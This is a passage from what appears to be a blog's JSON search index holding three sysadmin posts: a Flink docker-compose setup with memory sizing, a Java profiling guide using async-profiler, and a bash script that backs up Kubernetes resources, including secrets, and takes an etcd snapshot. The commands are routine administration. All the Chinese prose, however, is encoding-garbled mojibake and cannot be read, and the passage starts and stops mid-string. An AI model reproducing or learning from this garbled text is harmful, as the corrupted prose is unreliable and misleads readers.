¹æ®å…·ä½“æƒ…å†µæ¥åŠ¨æ€è°ƒæ•´ã€‚\n","permalink":"https://rendoumi.com/posts/20251121-flink_install/","summary":"\u003cp\u003eç”Ÿäº§ç¯å¢ƒç”¨åˆ°äº†Flinkï¼Œé‚£å…¶å®æ— è®ºè…¾è®¯çš„flinkè¿˜æ˜¯awsçš„flinkï¼Œéƒ½æ˜¯è¿è¡Œåœ¨å®¹å™¨ä¸­çš„\u003c/p\u003e\n\u003cp\u003eæ‰€ä»¥æˆ‘ä»¬è‡ªå»ºï¼Œä¹Ÿç”¨å®¹å™¨ï¼Œdocker-compose.yamlä¸€æŠŠæ¢­\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservices:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  jobmanager:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    image: flink:1.17.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ports:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"s2\"\u003e\u0026#34;8081:8081\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    command: jobmanager\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    environment:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eFLINK_PROPERTIES\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          jobmanager.memory.process.size: 4gb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          jobmanager.rpc.address: jobmanager\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  taskmanager:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    image: flink:1.17.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    depends_on:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - jobmanager\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    command: taskmanager\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    environment:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eFLINK_PROPERTIES\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        taskmanager.numberOfTaskSlots: \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        taskmanager.memory.process.size: 8gb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        jobmanager.rpc.address: jobmanager\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    deploy:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          replicas: \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„å•Šï¼Œä¸Šé¢èŠ‚ç‚¹æ˜¯16GBå†…å­˜ï¼Œæ‰€ä»¥jobåˆ†äº†4Gï¼Œç„¶åtaskç»™äº†8Gï¼ŒTaskSlotç»™äº†1ï¼Œå‰¯æœ¬ä¹Ÿæ˜¯1ã€‚å†…å­˜å¯Œè£•4Gã€‚æ˜¯è¿™ä¹ˆç®—çš„\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬å†çœ‹ä¸€ä¸ªé…ç½®ï¼Œæ˜¯æµ‹è¯•ç¯å¢ƒçš„ï¼ŒèŠ‚ç‚¹æ˜¯32Gï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservices:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  jobmanager:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    image: flink:1.17.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ports:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"s2\"\u003e\u0026#34;8081:8081\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    command: jobmanager\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    environment:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eFLINK_PROPERTIES\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          jobmanager.memory.process.size: 2gb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          jobmanager.rpc.address: jobmanager\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  taskmanager:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    image: flink:1.17.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    depends_on:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - jobmanager\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    command: taskmanager\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    environment:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eFLINK_PROPERTIES\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        taskmanager.numberOfTaskSlots: \u003cspan class=\"m\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        taskmanager.memory.process.size: 8gb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        jobmanager.rpc.address: jobmanager\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    deploy:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          replicas: \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæµ‹è¯•ç¯å¢ƒçš„å†…å­˜å°±å›§å¤šäº†ï¼Œjobmanageråªç»™äº†2Gï¼Œä½†æ˜¯ä»»åŠ¡å¤šä¸”å¤§ï¼Œ8Gå’ŒSlotç»™äº†4ï¼Œè¿™ä¸ªå€¼æ˜¯ä¸æ–­å¤±è´¥ç„¶åä¿®æ”¹å¾—åˆ°çš„\u003c/p\u003e","title":"ç”Ÿäº§ç¯å¢ƒFlinkçš„æ­å»º"},{"content":"æ²¡åŠæ³•äº†ï¼Œè¢«è¿ç»­é—®åˆ°è¿™ä¸ªé—®é¢˜ï¼Œå¿…é¡»è®²ä¸€ä¸‹äº†\njavaç¨‹åºå†™å¾—ä¸å¥½ï¼Œè¦ä¹ˆcpué«˜ï¼Œè¦ä¹ˆå†…å­˜é«˜ï¼Œå†…å­˜å¯ä»¥ä¸æ–­æ‰©å¤§ï¼Œæˆ‘ä»¬çš„æŸä¸ªpodï¼Œå·²ç»æ‰©åˆ°8Gäº†ï¼Œnodeæ€»å…±æ‰16Gï¼Œæ— è¯­å•Šã€‚\né‚£ç©¶ç«Ÿç”¨å•¥ç©æ„æ¥æ’æŸ¥å‘¢ï¼Ÿ\né‚£å¿…é¡»æ¨èasync-profileräº†\nä½¿ç”¨ä¹Ÿå¾ˆç®€å•ï¼Œè¿è¡Œæ’æŸ¥å³å¯\nmkdir -p /opt/app/profiler wget https://github.com/async-profiler/async-profiler/releases/download/v4.2/async-profiler-4.2-linux-x64.tar.gz tar zxvf async-profiler-4.2-linux-x64.tar.gz -C /opt/app/profiler --strip-components=1 å‘½ä»¤å¾ˆç®€å•ï¼Œå…³é”®æ˜¯å‚æ•°-eçš„é€‰æ‹©ï¼š\né«˜ CPU å ç”¨ (CPU-Bound)ï¼Ÿç¼ºçœå‚æ•° é¦–é€‰ï¼š -e cpu æˆ– -e cycles ç›®æ ‡ï¼š æŸ¥çœ‹ç«ç„°å›¾é¡¶ç«¯æœ€å®½çš„æ–¹æ³•ï¼Œå³æ¶ˆè€— CPU æœ€å¤šçš„è®¡ç®—ä»£ç ã€‚ I/O é˜»å¡ã€é”ç­‰å¾…æˆ–åº”ç”¨å‡æ­» (Latency/Blocking-Bound)ï¼Ÿ é¦–é€‰ï¼š -e wall ç›®æ ‡ï¼š æŸ¥æ‰¾ç«ç„°å›¾é¡¶ç«¯é•¿æ—¶é—´å¤„äº BLOCKED æˆ– I/O ç›¸å…³çš„ä»£ç å—ï¼Œæ‰¾å‡ºé˜»å¡çš„æ ¹æºã€‚ é¢‘ç¹ GC æˆ–å†…å­˜æ¶ˆè€—è¿‡å¿«ï¼Ÿ é¦–é€‰ï¼š -e alloc ç›®æ ‡ï¼š æ‰¾å‡ºå“ªäº›æ–¹æ³•åœ¨çŸ­æ—¶é—´å†…åˆ›å»ºäº†å¤§é‡å¯¹è±¡ï¼Œå¯¼è‡´å¹´è½»ä»£ GC é¢‘ç¹ã€‚ æ˜ç¡®æ€€ç–‘é”ç«äº‰ï¼Ÿ é¦–é€‰ï¼š -e lock ç›®æ ‡ï¼š å‡†ç¡®æ‰¾å‡ºå“ªä¸ªé”æ˜¯ä¸»è¦çš„ç«äº‰ç‚¹ã€‚ é‚£ç¡®å®šç›®æ ‡ï¼Œcpuæ˜¯ç¼ºçœå‚æ•°ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è¿è¡Œ\n./asprof -d 30 -f 1.html 1 è§£é‡Šï¼Œ-d åˆ†æå®è·µ30ç§’ï¼Œ-fè¾“å‡ºçš„æ–‡ä»¶ï¼Œæœ€åçš„1æ˜¯javaçš„è¿›ç¨‹å·ï¼Œè¿™æ ·å°±ç”Ÿæˆäº†ä¸€ä¸ª1.htmlçš„æ–‡ä»¶\næ‰“å¼€çœ‹çœ‹ï¼š\nçœ‹çœ‹åº•ä¸‹é‚£éƒ¨åˆ†ï¼Œkafkaç›¸å…³ï¼Œç‚¹å¼€åŠ¨è¾„æ˜¯63%ä¹‹æµçš„ï¼Œè¯´æ˜éƒ½å¹²è¿™äº‹äº†ï¼Œå»kafkaé‡ŒæŸ¥è¯¢è€—è´¹äº†å¤§é‡çš„cpuæ—¶é—´ã€‚\nç„¶åå†çœ‹çœ‹å†…å­˜ï¼Œå†æ”¶é›†ä¸€æ³¢ï¼š\n./asprof -d 30 -e alloc -f 2.html 1 åŒæ ·æ˜¯kafkaéƒ¨åˆ†ï¼Œåˆè€—å†…å­˜åˆè€—CPUã€‚å”‰ï¼Œä¼˜åŒ–å§ã€‚\n","permalink":"https://rendoumi.com/posts/20251117-java_profile/","summary":"\u003cp\u003eæ²¡åŠæ³•äº†ï¼Œè¢«è¿ç»­é—®åˆ°è¿™ä¸ªé—®é¢˜ï¼Œå¿…é¡»è®²ä¸€ä¸‹äº†\u003c/p\u003e\n\u003cp\u003ejavaç¨‹åºå†™å¾—ä¸å¥½ï¼Œè¦ä¹ˆcpué«˜ï¼Œè¦ä¹ˆå†…å­˜é«˜ï¼Œå†…å­˜å¯ä»¥ä¸æ–­æ‰©å¤§ï¼Œæˆ‘ä»¬çš„æŸä¸ªpodï¼Œå·²ç»æ‰©åˆ°8Gäº†ï¼Œnodeæ€»å…±æ‰16Gï¼Œæ— è¯­å•Šã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ç©¶ç«Ÿç”¨å•¥ç©æ„æ¥æ’æŸ¥å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eé‚£å¿…é¡»æ¨è\u003ccode\u003easync-profiler\u003c/code\u003eäº†\u003c/p\u003e\n\u003cp\u003eä½¿ç”¨ä¹Ÿå¾ˆç®€å•ï¼Œè¿è¡Œæ’æŸ¥å³å¯\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /opt/app/profiler\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/async-profiler/async-profiler/releases/download/v4.2/async-profiler-4.2-linux-x64.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf async-profiler-4.2-linux-x64.tar.gz -C /opt/app/profiler --strip-components\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå‘½ä»¤å¾ˆç®€å•ï¼Œå…³é”®æ˜¯å‚æ•°-eçš„é€‰æ‹©ï¼š\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eé«˜ CPU å ç”¨ (CPU-Bound)ï¼Ÿç¼ºçœå‚æ•°\u003c/strong\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eé¦–é€‰ï¼š\u003c/strong\u003e \u003ccode\u003e-e cpu\u003c/code\u003e æˆ– \u003ccode\u003e-e cycles\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eç›®æ ‡ï¼š\u003c/strong\u003e æŸ¥çœ‹ç«ç„°å›¾é¡¶ç«¯æœ€å®½çš„æ–¹æ³•ï¼Œå³æ¶ˆè€— CPU æœ€å¤šçš„è®¡ç®—ä»£ç ã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eI/O é˜»å¡ã€é”ç­‰å¾…æˆ–åº”ç”¨å‡æ­» (Latency/Blocking-Bound)ï¼Ÿ\u003c/strong\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eé¦–é€‰ï¼š\u003c/strong\u003e \u003ccode\u003e-e wall\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eç›®æ ‡ï¼š\u003c/strong\u003e æŸ¥æ‰¾ç«ç„°å›¾é¡¶ç«¯é•¿æ—¶é—´å¤„äº \u003ccode\u003eBLOCKED\u003c/code\u003e æˆ– I/O ç›¸å…³çš„ä»£ç å—ï¼Œæ‰¾å‡ºé˜»å¡çš„æ ¹æºã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eé¢‘ç¹ GC æˆ–å†…å­˜æ¶ˆè€—è¿‡å¿«ï¼Ÿ\u003c/strong\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eé¦–é€‰ï¼š\u003c/strong\u003e \u003ccode\u003e-e alloc\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eç›®æ ‡ï¼š\u003c/strong\u003e æ‰¾å‡ºå“ªäº›æ–¹æ³•åœ¨çŸ­æ—¶é—´å†…åˆ›å»ºäº†å¤§é‡å¯¹è±¡ï¼Œå¯¼è‡´å¹´è½»ä»£ GC é¢‘ç¹ã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eæ˜ç¡®æ€€ç–‘é”ç«äº‰ï¼Ÿ\u003c/strong\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eé¦–é€‰ï¼š\u003c/strong\u003e \u003ccode\u003e-e lock\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eç›®æ ‡ï¼š\u003c/strong\u003e å‡†ç¡®æ‰¾å‡ºå“ªä¸ªé”æ˜¯ä¸»è¦çš„ç«äº‰ç‚¹ã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eé‚£ç¡®å®šç›®æ ‡ï¼Œcpuæ˜¯ç¼ºçœå‚æ•°ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è¿è¡Œ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./asprof -d \u003cspan class=\"m\"\u003e30\u003c/span\u003e -f 1.html \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè§£é‡Šï¼Œ-d åˆ†æå®è·µ30ç§’ï¼Œ-fè¾“å‡ºçš„æ–‡ä»¶ï¼Œæœ€åçš„1æ˜¯javaçš„è¿›ç¨‹å·ï¼Œè¿™æ ·å°±ç”Ÿæˆäº†ä¸€ä¸ª1.htmlçš„æ–‡ä»¶\u003c/p\u003e\n\u003cp\u003eæ‰“å¼€çœ‹çœ‹ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251117163547425\" loading=\"lazy\" src=\"/posts/20251117-java_profile/image-20251117163547425.png\"\u003e\u003c/p\u003e","title":"Javaè¿›ç¨‹cpué«˜æ’æŸ¥"},{"content":"è¿™ä¸ªé—®é¢˜å…¶å®æ¯”è¾ƒæœ‰æ„æ€ï¼ŒåŒäº‹æ—©ä¸Šç”¨k9sä¿®æ”¹Deploymentçš„æ—¶å€™è¯¯åˆ äº†ä¸€ä¸ªdeploymentï¼Œè¿™ä¸‹éº»çƒ¦äº†ã€‚é‚£å…¶å®è‡ªå·±ä¹Ÿæœ‰è¿‡ç±»ä¼¼æ“ä½œï¼Œè¿ç§»çš„æ—¶å€™è¯¯åˆ è¿‡influxdbï¼Œæœ€åè€ƒå¤æ‰å¼„å›æ¥ï¼Œä¹Ÿè¯¯åˆ è¿‡ä¸€ä¸ªnsçš„secretï¼Œéƒ½æ˜¯å¤§éº»çƒ¦ï¼\nå…¶å®ç³»ç»Ÿæ˜¯æœ‰veleroå¤‡ä»½çš„ï¼Œä½†æ˜¯ä»é‚£é‡Œé¢å»å¼„å‡ºå•ç‹¬ä¸€ä¸ªnsçš„deployè¿›è¡Œæ¢å¤ï¼Œæ€ä¹ˆä¹Ÿæ¥ä¸åŠï¼Œé‚£å¹¸å¥½æœ‰æ¯æ—¥èµ„æºå¤‡ä»½ï¼Œç›´æ¥æ‹¿è¿‡æ¥é‡å»ºå³å¯ã€‚åˆ†äº«ä¸€ä¸‹è„šæœ¬ï¼Œé‚£æ³¨æ„ä¸€ä¸‹ï¼Œå› ä¸ºä¸»èŠ‚ç‚¹çš„etcdä¹Ÿæ˜¯éå¸¸è¦å‘½çš„ä¸œè¥¿ï¼Œä¹Ÿå¿…é¡»å¤‡ä¸€ä¸‹ï¼Œé˜²æ­¢ä¸»èŠ‚ç‚¹è„‘è£‚ï¼Œåˆ°æ—¶å€™å¯ä»¥ç”¨å¤‡ä»½è¿›è¡Œæ¢å¤ã€‚\n#!/bin/bash export KUBECONFIG=/root/.kube/config export PATH=/usr/local/bin:$PATH # K8s èµ„æºå¤‡ä»½è„šæœ¬ # ç›®æ ‡ï¼šéå†æ‰€æœ‰å‘½åç©ºé—´ï¼Œå°† Deployment, Secret, Ingress, å’Œ Service å¯¼å‡ºä¸º YAML æ–‡ä»¶ã€‚ # è®¾ç½®è¾“å‡ºç›®å½• OUTPUT_DIR=\u0026#34;/root/k8s_deployments_backup/$(date +%Y%m%d)\u0026#34; # è¦å¤‡ä»½çš„èµ„æºç±»å‹åŠå…¶å¯¹åº”çš„ kubectl åˆ«å # æ³¨æ„ï¼šSecret èµ„æºä¼šå¤‡ä»½æ‰€æœ‰ç±»å‹ï¼ŒåŒ…æ‹¬è‡ªåŠ¨ç”Ÿæˆçš„ Service Account Tokensã€‚ RESOURCE_TYPES=(\u0026#34;deployments\u0026#34; \u0026#34;secrets\u0026#34; \u0026#34;ingresses\u0026#34; \u0026#34;services\u0026#34;) # ç¡®ä¿è„šæœ¬åœ¨é‡åˆ°é”™è¯¯æ—¶ç«‹å³é€€å‡º set -e echo \u0026#34;--- æ­£åœ¨åˆ›å»ºè¾“å‡ºç›®å½•: $OUTPUT_DIR ---\u0026#34; mkdir -p \u0026#34;$OUTPUT_DIR\u0026#34; # ---------------------------------------------------- # æ ¸å¿ƒå‡½æ•°ï¼šå¤‡ä»½æŒ‡å®šç±»å‹çš„èµ„æº # å‚æ•°: $1 = èµ„æºç±»å‹ (å¦‚ deployment), $2 = å‘½åç©ºé—´, $3 = è¾“å‡ºç›®å½• # ---------------------------------------------------- backup_resource() { local TYPE=$1 local NAMESPACE=$2 local DIR=$3 # è·å–å½“å‰å‘½åç©ºé—´ä¸­æ‰€æœ‰è¯¥ç±»å‹èµ„æºçš„åç§° # ä½¿ç”¨ 2\u0026gt;/dev/null éšè—æ‰¾ä¸åˆ°èµ„æºæ—¶çš„é”™è¯¯ä¿¡æ¯ local RESOURCES=$(kubectl get \u0026#34;$TYPE\u0026#34; -n \u0026#34;$NAMESPACE\u0026#34; -o jsonpath=\u0026#39;{.items[*].metadata.name}\u0026#39; 2\u0026gt;/dev/null) if [ -z \u0026#34;$RESOURCES\u0026#34; ]; then echo \u0026#34; [ä¿¡æ¯] å‘½åç©ºé—´ $NAMESPACE ä¸­æœªæ‰¾åˆ° $TYPEã€‚\u0026#34; return fi echo \u0026#34; -\u0026gt; æ‰¾åˆ° ${#RESOURCES[@]} ä¸ª $TYPEï¼Œæ­£åœ¨å¯¼å‡º...\u0026#34; # éå†æ¯ä¸ªèµ„æºå¹¶ä¿å­˜ YAML for RESOURCE in $RESOURCES; do # æ–‡ä»¶åæ ¼å¼: namespace-resource_type-resourcename.yaml local FILE_NAME=\u0026#34;${NAMESPACE}-${TYPE}-${RESOURCE}.yaml\u0026#34; local FILE_PATH=\u0026#34;$DIR/$FILE_NAME\u0026#34; # ä½¿ç”¨ kubectl get è·å– YAMLï¼Œå¹¶é€šè¿‡ç®¡é“å’Œ sed æ¸…ç†å…ƒæ•°æ®å­—æ®µ kubectl get \u0026#34;$TYPE\u0026#34; \u0026#34;$RESOURCE\u0026#34; -n \u0026#34;$NAMESPACE\u0026#34; -o yaml --ignore-not-found | # æ¸…ç†å…ƒæ•°æ®å­—æ®µï¼Œä½¿ YAML æ›´å¹²å‡€ï¼Œä¾¿äºé‡æ–°åº”ç”¨ sed \u0026#39;/^ creationTimestamp:/d\u0026#39; | sed \u0026#39;/^ resourceVersion:/d\u0026#39; | sed \u0026#39;/^ uid:/d\u0026#39; | sed \u0026#39;/^ selfLink:/d\u0026#39; | sed \u0026#39;/^ status:/d\u0026#39; \\ \u0026gt; \u0026#34;$FILE_PATH\u0026#34; # æ£€æŸ¥ Secret æ˜¯å¦ä¸º Service Account Tokenï¼Œå¦‚æœæ˜¯ï¼Œåˆ™å‘å‡ºè­¦å‘Š if [ \u0026#34;$TYPE\u0026#34; == \u0026#34;secrets\u0026#34; ] \u0026amp;\u0026amp; grep -q \u0026#39;kubernetes.io/service-account.name\u0026#39; \u0026#34;$FILE_PATH\u0026#34;; then echo \u0026#34; [è­¦å‘Š] Secret $RESOURCE æ˜¯ Service Account Tokenï¼Œé€šå¸¸ä¸éœ€è¦å¤‡ä»½ã€‚\u0026#34; fi done } # 1. è·å–æ‰€æœ‰å‘½åç©ºé—´ (Namespace) NAMESPACES=$(kubectl get ns -o jsonpath=\u0026#39;{.items[*].metadata.name}\u0026#39;) if [ -z \u0026#34;$NAMESPACES\u0026#34; ]; then echo \u0026#34;é”™è¯¯ï¼šæœªæ‰¾åˆ°ä»»ä½•å‘½åç©ºé—´ã€‚è¯·æ£€æŸ¥ kubectl é…ç½®å’Œé›†ç¾¤è¿æ¥ã€‚\u0026#34; exit 1 fi echo \u0026#34;æ‰¾åˆ°ä»¥ä¸‹å‘½åç©ºé—´: $NAMESPACES\u0026#34; echo \u0026#34;----------------------------------------------------\u0026#34; # 2. éå†æ¯ä¸ªå‘½åç©ºé—´å’Œèµ„æºç±»å‹ for NAMESPACE in $NAMESPACES; do echo \u0026#34;--- å¤„ç†å‘½åç©ºé—´: $NAMESPACE ---\u0026#34; for TYPE in \u0026#34;${RESOURCE_TYPES[@]}\u0026#34;; do backup_resource \u0026#34;$TYPE\u0026#34; \u0026#34;$NAMESPACE\u0026#34; \u0026#34;$OUTPUT_DIR\u0026#34; done echo \u0026#34;--- å‘½åç©ºé—´ $NAMESPACE å¤„ç†å®Œæˆ ---\u0026#34; done ETCDCTL_API=3 etcdctl \\ --endpoints=https://10.10.240.3:2379 \\ --cacert=/etc/ssl/etcd/ca.pem \\ --cert=/etc/ssl/etcd/etcd-client.pem \\ --key=/etc/ssl/etcd/etcd-client-key.pem \\ snapshot save $OUTPUT_DIR/etcd-`date +%Y%m%d`-snapshot.db echo \u0026#34;====================================================\u0026#34; echo \u0026#34;âœ… æ‰€æœ‰æŒ‡å®šèµ„æºå·²æˆåŠŸå¤‡ä»½åˆ°ç›®å½•: $OUTPUT_DIR\u0026#34; echo \u0026#34;====================================================\u0026#34; exit 0 ","permalink":"https://rendoumi.com/posts/20251117-k8s_resource_backup/","summary":"\u003cp\u003eè¿™ä¸ªé—®é¢˜å…¶å®æ¯”è¾ƒæœ‰æ„æ€ï¼ŒåŒäº‹æ—©ä¸Šç”¨k9sä¿®æ”¹Deploymentçš„æ—¶å€™è¯¯åˆ äº†ä¸€ä¸ªdeploymentï¼Œè¿™ä¸‹éº»çƒ¦äº†ã€‚é‚£å…¶å®è‡ªå·±ä¹Ÿæœ‰è¿‡ç±»ä¼¼æ“ä½œï¼Œè¿ç§»çš„æ—¶å€™è¯¯åˆ è¿‡influxdbï¼Œæœ€åè€ƒå¤æ‰å¼„å›æ¥ï¼Œä¹Ÿè¯¯åˆ 